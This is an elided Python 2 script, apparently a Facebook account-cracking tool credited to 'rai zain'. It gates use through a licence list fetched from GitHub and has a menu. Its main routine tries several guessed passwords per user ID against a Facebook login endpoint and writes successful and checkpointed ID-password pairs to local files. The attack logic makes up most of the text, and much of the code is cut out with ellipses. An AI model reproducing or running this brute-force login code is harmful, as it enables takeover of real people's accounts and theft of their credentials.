...
__author__ = rai zain'
__copyright = 'All rights reserved . Copyright  rai zain'
...
def reg():
    ...
    r = requests.get('https://raw.githubusercontent.com/Hamzajmkofficial/Hamzajmk/main/server.txt').text
    if to in r:
        ...
        os.system('xdg-open https://wa.me/03483754508')
        reg()
...
def menu():
    ...
    print '\x1b[1;92m[6] Youtube Hamza Munir Official'
    menu_s()
...
def menu_s():
    ...
    if ms == '1':
        ...
        os.system('python2 raizainmpg.py')
    elif ms == '4':
        v_tok()
    elif ms == '5':
        lout()
...
def a_s():
    ...
    if a_s == '1':
        os.system('clear')
        print logo
        print '\x1b[1;93m~~~~ rai zain cracking ~~~~\x1b[1;91m'
        print 47 * '-'
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;94mrai zain OFFICIAL Kings Of Facebook\x1b[1;91m'
    print 47 * '-'
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;92m[ZAIN-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[ZAIN-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;31;1m[RAI-CP] ' + uid + ' | ' + pass2
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[RAI-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;31;1m[RAI-CP] ' + uid + ' | ' + pass3
                        cp = open('RAI_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[ZAIN-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;31;1m[RAI-CP] ' + uid + ' | ' + pass4
                            cp = open('RAI_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
        ...
        try:
            ...
            if 'loc' in q:
                ...
                if 'loc' in q:
                    ...
                    print '\x1b[1;31;1m[OHH-CP] ' + uid + ' | ' + pass2
                    cp = open('HOP_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
